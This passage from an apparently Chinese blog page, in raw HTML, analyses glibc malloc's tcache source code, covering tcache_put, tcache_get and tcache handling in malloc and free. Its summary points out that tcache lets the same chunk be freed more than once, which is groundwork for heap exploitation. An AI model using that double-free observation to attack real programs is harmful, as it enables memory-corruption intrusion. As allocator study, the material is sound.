class="line"></span><br><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> <span class="title">tcache_perthread_struct</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">  <span class="keyword">char</span> counts[TCACHE_MAX_BINS];</span><br><span class="line">  tcache_entry *entries[TCACHE_MAX_BINS]; <span class="comment">// TCACHE_MAX_BINS = 64</span></span><br><span class="line">&#125; tcache_perthread_struct;</span><br></pre></td></tr></table></figure><p><code>tcache</code> 也是使用 类似 bins 方式来管理<code>tcache</code>  。</p><p><code>tcache_perthread_struct</code> 是整个<code>tcache</code> </p><p>每一项由 相同大小的 chunk 通过 <code>tcache_entry</code> 使用单向链表链接（类似于fastbin的链接方式）。</p><p>counts 用于记录 entries 中每一项当前链入的 chunk 数目， 最多可以有 7 个 chunk。</p><p><code>tcache_entry</code> 用于链接 chunk 的结构体， 其中就一个 next 指针，指向下一个相同大小的 chunk.</p><h3 id="基本操作"><a href="#基本操作" class="headerlink" title="基本操作"></a>基本操作</h3><p>下面通过分析对 tcache 的两个基本操作理解上面结构体的作用</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">static</span> __always_inline <span class="keyword">void</span></span><br><span class="line">tcache_put (mchunkptr chunk, <span class="keyword">size_t</span> tc_idx)</span><br><span class="line">&#123;</span><br><span class="line">  tcache_entry *e = (tcache_entry *) chunk2mem (chunk);</span><br><span class="line">  assert (tc_idx &lt; TCACHE_MAX_BINS);</span><br><span class="line">  e-&gt;next = tcache-&gt;entries[tc_idx];</span><br><span class="line">  tcache-&gt;entries[tc_idx] = e;  <span class="comment">// 增加到链表头部</span></span><br><span class="line">  ++(tcache-&gt;counts[tc_idx]);  <span class="comment">// 记录当前 bin 的 chunk数</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">static</span> __always_inline <span class="keyword">void</span> *</span><br><span class="line">tcache_get (<span class="keyword">size_t</span> tc_idx)</span><br><span class="line">&#123;</span><br><span class="line">  tcache_entry *e = tcache-&gt;entries[tc_idx];</span><br><span class="line">  assert (tc_idx &lt; TCACHE_MAX_BINS);</span><br><span class="line">  assert (tcache-&gt;entries[tc_idx] &gt; <span class="number">0</span>);</span><br><span class="line">  tcache-&gt;entries[tc_idx] = e-&gt;next;</span><br><span class="line">  --(tcache-&gt;counts[tc_idx]);</span><br><span class="line">  <span class="keyword">return</span> (<span class="keyword">void</span> *) e;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="tcache-put"><a href="#tcache-put" class="headerlink" title="tcache_put"></a>tcache_put</h3><p>用于把一个 <code>chunk</code> 放到 指定的 <code>tcache-&gt;entries</code> 里面去， <code>tc_idx</code> 通过 <code>csize2tidx (nb)</code> 计算得到 （<code>nb</code>是 <code>chunk</code> 的大小）。</p><p>它首先把 <code>chunk+2*SIZE_SZ</code> （就是除去 <code>header</code> 部分） 强制转换成 <code>tcache_entry *</code> 类型，然后插入到 <code>tcache-&gt;entries[tc_idx]</code> 的首部，最后把 <code>tcache-&gt;counts[tc_idx]</code> 加 <code>1</code> ，表示新增了一个 <code>chunk</code> 到 该 表项。</p><h3 id="tcache-get"><a href="#tcache-get" class="headerlink" title="tcache_get"></a>tcache_get</h3><p>根据 <code>tc_idx</code> 取出 <code>tcache-&gt;entries[tc_idx]</code> 的第一个<code>chunk</code> ， 然后把 指针强制转换为 <code>(void *)</code></p><p>这样就可以大概得到一个图</p><ul><li><code>tcache-&gt;entries</code> 的每一项通过 单向链表链接 <code>chunk</code> 。</li><li><code>tcache_entry</code> 和 <code>malloc chunk</code> 是重叠的， <code>tcache_entry-&gt;next</code> 和 <code>chunk-&gt;fd</code> 是一个位置。</li></ul><h2 id="tcache-in-malloc"><a href="#tcache-in-malloc" class="headerlink" title="tcache in malloc"></a>tcache in malloc</h2><h3 id="libc-malloc"><a href="#libc-malloc" class="headerlink" title="__libc_malloc"></a>__libc_malloc</h3><p><code>malloc</code> 的入口点是 <code>__libc_malloc</code> （做了一些注释）</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line">__libc_malloc (<span class="keyword">size_t</span> bytes)</span><br><span class="line">&#123;</span><br><span class="line">.............</span><br><span class="line">.............</span><br><span class="line">.............</span><br><span class="line"><span class="meta">#<span class="meta-keyword">if</span> USE_TCACHE</span></span><br><span class="line">  <span class="comment">/* int_free also calls request2size, be careful to not pad twice.  */</span></span><br><span class="line">  <span class="keyword">size_t</span> tbytes;</span><br><span class="line">  checked_request2size (bytes, tbytes);  <span class="comment">// tbytes 为 bytes请求的 转换后得到的 chunk 的 size</span></span><br><span class="line">  <span class="keyword">size_t</span> tc_idx = csize2tidx (tbytes);  <span class="comment">// 根据大小 tbytes ， 找到 tcache-&gt;entries 索引</span></span><br><span class="line">  MAYBE_INIT_TCACHE ();</span><br><span class="line">  DIAG_PUSH_NEEDS_COMMENT;</span><br><span class="line">  <span class="keyword">if</span> (tc_idx &lt; mp_.tcache_bins</span><br><span class="line">      <span class="comment">/*&amp;&amp; tc_idx &lt; TCACHE_MAX_BINS*/</span> <span class="comment">/* to appease gcc */</span></span><br><span class="line">      &amp;&amp; tcache</span><br><span class="line">      &amp;&amp; tcache-&gt;entries[tc_idx] != <span class="literal">NULL</span>) <span class="comment">// 如果 tcache-&gt;entries[tc_idx] 有 chunk ，就返回</span></span><br><span class="line">    &#123;</span><br><span class="line">      <span class="keyword">return</span> tcache_get (tc_idx); <span class="comment">// 调用 tcache_get 拿到 chunk 然后返回</span></span><br><span class="line">    &#125;</span><br><span class="line">  DIAG_POP_NEEDS_COMMENT;</span><br><span class="line"><span class="meta">#<span class="meta-keyword">endif</span></span></span><br><span class="line">  <span class="keyword">if</span> (SINGLE_THREAD_P)</span><br><span class="line">    &#123;</span><br><span class="line">      victim = _int_malloc (&amp;main_arena, bytes);</span><br><span class="line">      assert (!victim || chunk_is_mmapped (mem2chunk (victim)) ||</span><br><span class="line">      &amp;main_arena == arena_for_chunk (mem2chunk (victim)));</span><br><span class="line">      <span class="keyword">return</span> victim;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">  arena_get (ar_ptr, bytes);</span><br><span class="line">  victim = _int_malloc (ar_ptr, bytes);</span><br></pre></td></tr></table></figure><p>首先判断 <code>tcache-&gt;entries[tc_idx]</code> 里面有没有 <code>chunk</code> ，如果有就直接返回，否则进入 <code>_int_malloc</code> 分配内存。</p><p>下面看看 <code>_int_malloc</code> （主要看 <code>tcache</code> 处理的部分）</p><h3 id="int-malloc"><a href="#int-malloc" class="headerlink" title="_int_malloc"></a>_int_malloc</h3><h4 id="处理fastbin"><a href="#处理fastbin" class="headerlink" title="处理fastbin"></a>处理fastbin</h4><p>首先是把 请求的 <code>size</code> 转换成 实际 <code>malloc</code> 内部的 <code>size</code> ，然后定义了一个宏</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 从 fastbin里面移除 pp</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> REMOVE_FB(fb, victim, pp)\</span></span><br><span class="line">  <span class="keyword">do</span>\</span><br><span class="line">    &#123;\</span><br><span class="line">      victim = pp;\</span><br><span class="line">      <span class="keyword">if</span> (victim == <span class="literal">NULL</span>)\</span><br><span class="line"><span class="keyword">break</span>;\</span><br><span class="line">    &#125;\</span><br><span class="line">  <span class="keyword">while</span> ((pp = catomic_compare_and_exchange_val_acq (fb, victim-&gt;fd, victim)) \</span><br><span class="line"> != victim);</span><br></pre></td></tr></table></figure><p>用于多线程的中从 <code>fastbin</code> 里面移除一个 <code>chunk</code>.</p><p>然后进入分配的流程， 首先如果 <code>size</code> 在 <code>fastbin</code> 的范围内进入， <code>fastbin</code> 分配的流程</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br></pre></td><td class="code"><pre><span class="line"> <span class="keyword">if</span> ((<span class="keyword">unsigned</span> <span class="keyword">long</span>) (nb) &lt;= (<span class="keyword">unsigned</span> <span class="keyword">long</span>) (get_max_fast ()))</span><br><span class="line">    &#123;</span><br><span class="line">      idx = fastbin_index (nb);</span><br><span class="line">      mfastbinptr *fb = &amp;fastbin (av, idx);</span><br><span class="line">      mchunkptr pp;</span><br><span class="line">      victim = *fb;</span><br><span class="line"></span><br><span class="line">      <span class="keyword">if</span> (victim != <span class="literal">NULL</span>)</span><br><span class="line">&#123;</span><br><span class="line">  <span class="keyword">if</span> (SINGLE_THREAD_P)</span><br><span class="line">    *fb = victim-&gt;fd;</span><br><span class="line">  <span class="keyword">else</span></span><br><span class="line">    REMOVE_FB (fb, pp, victim);</span><br><span class="line">  <span class="keyword">if</span> (__glibc_likely (victim != <span class="literal">NULL</span>))</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="keyword">size_t</span> victim_idx = fastbin_index (chunksize (victim));</span><br><span class="line">      <span class="keyword">if</span> (__builtin_expect (victim_idx != idx, <span class="number">0</span>))</span><br><span class="line">malloc_printerr (<span class="string">"malloc(): memory corruption (fast)"</span>);</span><br><span class="line">      check_remalloced_chunk (av, victim, nb);</span><br><span class="line"><span class="meta">#<span class="meta-keyword">if</span> USE_TCACHE</span></span><br><span class="line"></span><br><span class="line">      <span class="keyword">size_t</span> tc_idx = csize2tidx (nb);</span><br><span class="line">      <span class="keyword">if</span> (tcache &amp;&amp; tc_idx &lt; mp_.tcache_bins)   <span class="comment">// 把该 fastbin 里面其他的 bin 放到 tcache 里面</span></span><br><span class="line">&#123;</span><br><span class="line">  mchunkptr tc_victim;</span><br><span class="line"></span><br><span class="line">  <span class="comment">/* While bin not empty and tcache not full, copy chunks.  */</span></span><br><span class="line">  <span class="keyword">while</span> (tcache-&gt;counts[tc_idx] &lt; mp_.tcache_count  <span class="comment">// 判断 tcache 中指定 bin 中 chunk 是否超过 7</span></span><br><span class="line"> &amp;&amp; (tc_victim = *fb) != <span class="literal">NULL</span>)</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="keyword">if</span> (SINGLE_THREAD_P)</span><br><span class="line">*fb = tc_victim-&gt;fd;</span><br><span class="line">      <span class="keyword">else</span></span><br><span class="line">&#123;</span><br><span class="line">  REMOVE_FB (fb, pp, tc_victim);</span><br><span class="line">  <span class="keyword">if</span> (__glibc_unlikely (tc_victim == <span class="literal">NULL</span>))</span><br><span class="line">    <span class="keyword">break</span>;</span><br><span class="line">&#125;</span><br><span class="line">      tcache_put (tc_victim, tc_idx);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">#<span class="meta-keyword">endif</span></span></span><br><span class="line">      <span class="keyword">void</span> *p = chunk2mem (victim);</span><br><span class="line">      alloc_perturb (p, bytes);</span><br><span class="line">      <span class="keyword">return</span> p;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure><ul><li>在 相应 <code>fastbin</code> 找到 合适的 <code>chunk</code> 后，就把 该 <code>chunk</code> 从 <code>fastbin</code> 里面拿下来</li><li>然后 把相应 <code>fastbin</code> 里面剩下的 <code>chunk</code> 全都放到 <code>tcache</code> 里面 ， 直到 <code>tcache-&gt;entries[tc_idx]</code> 满了 (已经有 <code>7</code> 个 <code>chunk</code> 了，即 <code>tcache-&gt;counts[tc_idx] = mp_.tcache_count = 7</code> ）。</li><li>最后在返回一开始拿到的 <code>chunk</code> 给用户</li></ul><p>如果 <code>fastbin</code> 不能分配，则进入 <code>smallbin</code> 的分配流程</p><h4 id="处理-smallbin"><a href="#处理-smallbin" class="headerlink" title="处理 smallbin"></a>处理 smallbin</h4><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> (in_smallbin_range (nb))</span><br><span class="line">    &#123;</span><br><span class="line">      idx = smallbin_index (nb);</span><br><span class="line">      bin = bin_at (av, idx);</span><br><span class="line"></span><br><span class="line">      <span class="keyword">if</span> ((victim = last (bin)) != bin)</span><br><span class="line">        &#123;</span><br><span class="line">          bck = victim-&gt;bk;</span><br><span class="line">  <span class="keyword">if</span> (__glibc_unlikely (bck-&gt;fd != victim))</span><br><span class="line">    malloc_printerr (<span class="string">"malloc(): smallbin double linked list corrupted"</span>);</span><br><span class="line">          set_inuse_bit_at_offset (victim, nb);</span><br><span class="line">          bin-&gt;bk = bck; </span><br><span class="line">          bck-&gt;fd = bin;  <span class="comment">// 找到 chunk ， 从 smallbin拿下来准备返回给用户</span></span><br><span class="line"></span><br><span class="line">          <span class="keyword">if</span> (av != &amp;main_arena)</span><br><span class="line">    set_non_main_arena (victim);</span><br><span class="line">          check_malloced_chunk (av, victim, nb);</span><br><span class="line"><span class="meta">#<span class="meta-keyword">if</span> USE_TCACHE</span></span><br><span class="line">  <span class="comment">/* While we're here, if we see other chunks of the same size, // 把指定 smallbin 里面的 bin扔到 tcache里面</span></span><br><span class="line"><span class="comment">     stash them in the tcache.  */</span></span><br><span class="line">  <span class="keyword">size_t</span> tc_idx = csize2tidx (nb);</span><br><span class="line">  <span class="keyword">if</span> (tcache &amp;&amp; tc_idx &lt; mp_.tcache_bins)</span><br><span class="line">    &#123;</span><br><span class="line">      mchunkptr tc_victim;</span><br><span class="line"></span><br><span class="line">      <span class="comment">/* While bin not empty and tcache not full, copy chunks over.  */</span></span><br><span class="line">      <span class="keyword">while</span> (tcache-&gt;counts[tc_idx] &lt; mp_.tcache_count</span><br><span class="line">     &amp;&amp; (tc_victim = last (bin)) != bin)</span><br><span class="line">&#123;</span><br><span class="line">  <span class="keyword">if</span> (tc_victim != <span class="number">0</span>)</span><br><span class="line">    &#123;</span><br><span class="line">      bck = tc_victim-&gt;bk;</span><br><span class="line">      set_inuse_bit_at_offset (tc_victim, nb);</span><br><span class="line">      <span class="keyword">if</span> (av != &amp;main_arena)</span><br><span class="line">set_non_main_arena (tc_victim);</span><br><span class="line">      bin-&gt;bk = bck;</span><br><span class="line">      bck-&gt;fd = bin;</span><br><span class="line"></span><br><span class="line">      tcache_put (tc_victim, tc_idx);</span><br><span class="line">            &#125;</span><br><span class="line">&#125;</span><br><span class="line">    &#125;</span><br><span class="line"><span class="meta">#<span class="meta-keyword">endif</span></span></span><br><span class="line">          <span class="keyword">void</span> *p = chunk2mem (victim);</span><br><span class="line">          alloc_perturb (p, bytes);</span><br><span class="line">          <span class="keyword">return</span> p;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure><p>和 <code>fastbin</code> 是类似的操作， 在 <code>size</code> 对应的 <code>smallbin</code> 里面找到 <code>chunk</code> 后</p><p>把这个 <code>chunk</code> 从链表上取下来</p><p>然后把该 <code>smallbin</code> 里面剩下的 <code>bin</code> 放入到 <code>tcache</code> ， 直到 <code>tcache-&gt;entries[tc_idx]</code> 满.</p><p>如果 <code>smallbin</code> 也没能分配，进入 <code>unsorted bin</code></p><h4 id="遍历unsorted-bin"><a href="#遍历unsorted-bin" class="headerlink" title="遍历unsorted bin"></a>遍历unsorted bin</h4><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br></pre></td><td class="code"><pre><span class="line"> <span class="keyword">int</span> iters = <span class="number">0</span>;</span><br><span class="line">      <span class="keyword">while</span> ((victim = unsorted_chunks (av)-&gt;bk) != unsorted_chunks (av))</span><br><span class="line">        &#123;</span><br><span class="line">          ....................</span><br><span class="line">          ....................</span><br><span class="line">          ....................</span><br><span class="line">          <span class="comment">/* remove from unsorted list */</span></span><br><span class="line">          unsorted_chunks (av)-&gt;bk = bck;</span><br><span class="line">          bck-&gt;fd = unsorted_chunks (av);</span><br><span class="line">          <span class="comment">// 把 bin 从 unsorted bin 里面拿下来后，先放入 tcache </span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">if</span> USE_TCACHE</span></span><br><span class="line">     <span class="comment">// 如果unsorted bin 的大小正好，扔到 tcache ，然后继续遍历</span></span><br><span class="line"> We may <span class="keyword">return</span> one of these chunks later.  */</span><br><span class="line">      <span class="keyword">if</span> (tcache_nb</span><br><span class="line">  &amp;&amp; tcache-&gt;counts[tc_idx] &lt; mp_.tcache_count)</span><br><span class="line">&#123;</span><br><span class="line">  tcache_put (victim, tc_idx);</span><br><span class="line">  return_cached = <span class="number">1</span>;</span><br><span class="line">  <span class="keyword">continue</span>;</span><br><span class="line">&#125;</span><br><span class="line">      <span class="keyword">else</span></span><br><span class="line">&#123;</span><br><span class="line">#endif</span><br><span class="line">              check_malloced_chunk (av, victim, nb);</span><br><span class="line">              <span class="keyword">void</span> *p = chunk2mem (victim);</span><br><span class="line">              alloc_perturb (p, bytes);</span><br><span class="line">              <span class="keyword">return</span> p;</span><br><span class="line"><span class="meta">#<span class="meta-keyword">if</span> USE_TCACHE</span></span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">#<span class="meta-keyword">endif</span></span></span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">         <span class="comment">//大小不刚好等于需要的size 的话，就把 bin放到 相应的 bin 里面。</span></span><br><span class="line">         .......................................</span><br><span class="line">         .......................................</span><br><span class="line">         .......................................</span><br><span class="line"><span class="meta">#<span class="meta-keyword">if</span> USE_TCACHE</span></span><br><span class="line">      <span class="comment">//如果有 大小适配的 unsorted bin 进入了 tcache(return_cached=1) 同时 mp_.tcache_unsorted_limit &gt; 0 默认为 0 ，不会进入分支, 继续遍历 </span></span><br><span class="line">      ++tcache_unsorted_count;</span><br><span class="line">      <span class="keyword">if</span> (return_cached</span><br><span class="line">  &amp;&amp; mp_.tcache_unsorted_limit &gt; <span class="number">0</span></span><br><span class="line">  &amp;&amp; tcache_unsorted_count &gt; mp_.tcache_unsorted_limit)</span><br><span class="line">&#123;</span><br><span class="line">  <span class="keyword">return</span> tcache_get (tc_idx);</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">#<span class="meta-keyword">endif</span></span></span><br><span class="line"></span><br><span class="line">         .......................................</span><br><span class="line">         .......................................</span><br><span class="line">         .......................................</span><br><span class="line">         &#125; <span class="comment">// end of  while ((victim = unsorted_chunks (av)-&gt;b</span></span><br><span class="line"></span><br><span class="line"><span class="comment">//遍历完 unsorted bin 后 ，根据 return_cached 判断 tcache 里面是否有合适的 chunk</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">if</span> USE_TCACHE</span></span><br><span class="line">      <span class="comment">/* If all the small chunks we found ended up cached, return one now.  */</span></span><br><span class="line">      <span class="keyword">if</span> (return_cached)</span><br><span class="line">&#123;</span><br><span class="line">  <span class="keyword">return</span> tcache_get (tc_idx);</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">#<span class="meta-keyword">endif</span></span></span><br></pre></td></tr></table></figure><ul><li>在遍历 <code>unsorted bin</code> 的时候， 如果找到大小刚好满足的 <code>bin</code> ， 不会立刻返回，而是把这个 <code>bin</code> 放入 <code>tcache</code> 里面，并且设置 <code>return_cached=1</code> ，表示 有 大小适配的 <code>unsorted bin</code> 进入了 <code>tcache</code></li><li>如果大小不是正好满足需要，就走一般的流程，把 <code>bin</code> 放到相应的 <code>smallbin</code> 或者 <code>largebin</code> 里面</li><li>遍历 <code>unsorted bin</code> 的最后，会根据 <code>return_cached</code> 判断是否有 大小适配的 <code>unsorted bin</code> 进入了 <code>tcache</code> ， <code>mp_.tcache_unsorted_limit</code> 默认为 <code>0</code> ，所以不会进入分支， 这样就会把所有的 <code>unsorted bin</code> 都放入到 <code>tcache</code>。</li><li>遍历完 <code>unsorted bin</code> 后 ，根据 <code>return_cached</code> 判断 <code>tcache</code> 里面是否有合适的 <code>chunk</code> ，有的话就可以返回了</li><li>否则 <code>large bin</code> ，<code>top chunk</code> 来分配</li></ul><h2 id="tcache-in-free"><a href="#tcache-in-free" class="headerlink" title="tcache in free"></a>tcache in free</h2><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">static</span> <span class="keyword">void</span></span><br><span class="line">_int_free (mstate av, mchunkptr p, <span class="keyword">int</span> have_lock)</span><br><span class="line">&#123;</span><br><span class="line"></span><br><span class="line">  size = chunksize (p);</span><br><span class="line">  check_inuse_chunk(av, p);</span><br><span class="line"><span class="meta">#<span class="meta-keyword">if</span> USE_TCACHE</span></span><br><span class="line">  &#123;</span><br><span class="line">    <span class="keyword">size_t</span> tc_idx = csize2tidx (size);  <span class="comment">// tcache bin 的索引</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (tcache</span><br><span class="line">&amp;&amp; tc_idx &lt; mp_.tcache_bins  <span class="comment">// 64 ，最多 64 个 bin</span></span><br><span class="line">&amp;&amp; tcache-&gt;counts[tc_idx] &lt; mp_.tcache_count)  <span class="comment">// 7 ，tcache-&gt;counts 存放每个 bin 已经存放的 chunk数量</span></span><br><span class="line">      &#123;</span><br><span class="line">tcache_put (p, tc_idx);</span><br><span class="line"><span class="keyword">return</span>;</span><br><span class="line">      &#125;</span><br><span class="line">  &#125;</span><br><span class="line"><span class="meta">#<span class="meta-keyword">endif</span></span></span><br></pre></td></tr></table></figure><p>删掉了一些没影响的代码</p><ul><li>首先就是获取要释放的 <code>chunk</code> 的 <code>size</code> , 然后判断 <code>size</code> 是否符和规范（是否对齐之类的 <code>check</code> )， 如果合规就看 <code>tcache-&gt;counts[tc_idx]</code> 是否已经满了 ，如果没有满就直接放入 <code>tcache</code> ， 然后返回。</li><li>否则就和没有 <code>tcache</code> 是一样的处理</li></ul><h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2><p>在 <code>free</code> 的时候，会检测 <code>p</code> 的下一个 <code>chunk( next )</code> 的 <code>PREV_INUSE</code> 位，但是如果 <code>chunk</code> 被放入了 tcache ，<code>next-&gt;PREV_INUSE</code> 位不会被修改 ，所以还是会标志为 <code>in_used</code> . 所以我们可以 <strong>多次释放同一个 <code>chunk</code> .</strong></p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line">  size = chunksize (p);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> (__builtin_expect ((<span class="keyword">uintptr_t</span>) p &gt; (<span class="keyword">uintptr_t</span>) -size, <span class="number">0</span>)</span><br><span class="line">      || __builtin_expect (misaligned_chunk (p), <span class="number">0</span>))</span><br><span class="line">    malloc_printerr (<span class="string">"free(): invalid pointer"</span>);</span><br><span class="line"> </span><br><span class="line">  <span class="keyword">if</span> (__glibc_unlikely (size &lt; MINSIZE || !aligned_OK (size)))</span><br><span class="line">    malloc_printerr (<span class="string">"free(): invalid size"</span>);</span><br><span class="line"></span><br><span class="line">  check_inuse_chunk(av, p); <span class="comment">// 通过下一个 chunk 的 pre_inused 位，判断当前 chunk 释放已经被释放</span></span><br><span class="line">  </span><br><span class="line"><span class="meta">#<span class="meta-keyword">if</span> USE_TCACHE</span></span><br><span class="line">  &#123;</span><br><span class="line">    <span class="keyword">size_t</span> tc_idx = csize2tidx (size);  <span class="comment">// tcache bin 的索引</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (tcache</span><br><span class="line">&amp;&amp; tc_idx &lt; mp_.tcache_bins  <span class="comment">// 64 ，最多 64 个 bin</span></span><br><span class="line">&amp;&amp; tcache-&gt;counts[tc_idx] &lt; mp_.tcache_count)  <span class="comment">// 7 ，tcache-&gt;counts 存放每个 bin 已经存放的 chunk数量</span></span><br><span class="line">      &#123;</span><br><span class="line">tcache_put (p, tc_idx);  <span class="comment">// 如果 chunk 被放入了 tcache ，next-&gt;pre_inuse 不会被修改。</span></span><br><span class="line"><span class="keyword">return</span>;</span><br><span class="line">      &#125;</span><br><span class="line">  &#125;</span><br><span class="line"><span class="meta">#<span class="meta-keyword">endif</span></span></span><br></pre></td></tr></table></figure><p>同时在 <code>malloc</code> 的时候 ，先尝试 <code>tcache</code> 分配</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span 